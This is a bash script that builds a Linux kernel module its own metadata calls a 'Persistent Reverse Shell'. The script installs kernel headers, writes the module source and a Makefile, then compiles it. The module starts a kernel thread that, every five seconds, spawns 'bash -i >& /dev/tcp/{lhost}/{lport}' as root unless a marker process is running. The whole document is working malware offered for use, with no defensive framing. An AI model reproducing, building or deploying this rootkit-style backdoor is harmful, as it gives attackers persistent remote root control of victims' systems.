#!/bin/bash

# Obtener la versión del kernel actual
KERNEL_VERSION=$(uname -r)

# Directorio donde se guardarán las fuentes del kernel
DEST_DIR="/usr/src/linux-headers-$KERNEL_VERSION"

# Función para descargar y extraer las fuentes del kernel
download_kernel_sources() {
    local version=$1
    local package="linux-headers-$version"

    echo "[*] Downloading $version..."
    sudo apt-get update
    sudo apt-get install -y $package

    if [ $? -ne 0 ]; then
        echo "[!] Error downloading kernel."
        exit 1
    fi

    echo "[OK] Sources kernel $version installed in $DEST_DIR."
}

# Verificar si se proporcionó una versión específica del kernel
if [ $# -eq 1 ]; then
    KERNEL_VERSION=$1
fi

# Descargar y extraer las fuentes del kernel
download_kernel_sources $KERNEL_VERSION

# Crear el archivo fuente del módulo del kernel
SOURCE_FILE="rock.c"
cat > $SOURCE_FILE <<EOL
#include <linux/init.h>
#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/kthread.h>
#include <linux/delay.h>
#include <linux/sched/signal.h>
#include <linux/string.h>

MODULE_LICENSE("GPL");
MODULE_AUTHOR("matheuzsec");
MODULE_DESCRIPTION("Persistent Reverse Shell with Kernel Thread Monitoring and Uninterruptible Sleep");

struct task_struct *mon_thread;
struct task_struct *task;

int mon_shell(void *data) {
    while (!kthread_should_stop()) {
        bool process_found = false;

        for_each_process(task) {
            printk(KERN_INFO "Checking process: %s (PID: %d)\n", task->comm, task->pid);

            if (strncmp(task->comm, "noprocname", 10) == 0 && task->comm[10] == '\0') {
                process_found = true;
                printk(KERN_INFO "Process 'noprocname' found (PID: %d)\n", task->pid);
                break;
            }
        }

        if (!process_found) {
            call_usermodehelper("/bin/bash",
                                (char *[]){"/bin/bash", "-c", "bash -i >& /dev/tcp/{lhost}/{lport} 0>&1", NULL},
                                NULL, UMH_WAIT_EXEC);

            printk(KERN_INFO "Executing reverse shell!\n");
        }

        ssleep(5);
    }
    return 0;
}

static int __init uninterruptible_sleep_init(void) {
    mon_thread = kthread_run(mon_shell, NULL, "matheuz");

    if (IS_ERR(mon_thread)) {
        printk(KERN_ALERT "Failed to create thread!\n");
        return PTR_ERR(mon_thread);
    }

    printk(KERN_INFO "Monitoring started!\n");
    return 0;
}

static void __exit uninterruptible_sleep_exit(void) {
    if (mon_thread) {
        kthread_stop(mon_thread);
        printk(KERN_INFO "Monitoring stopped!\n");
    }
}

module_init(uninterruptible_sleep_init);
module_exit(uninterruptible_sleep_exit);
EOL

# Crear el Makefile para el módulo del kernel
MAKEFILE="Makefile"
KDIR=$(uname -r)
PWD=$(pwd)

cat > $MAKEFILE <<EOL
obj-m += rock.o

all:
	make -C /lib/modules/$KDIR/build M=\$(PWD) modules

clean:
	make -C /lib/modules/$KDIR/build M=\$(PWD) clean
EOL

# Compilar el módulo del kernel
make all

# Limpiar los archivos temporales
make clean
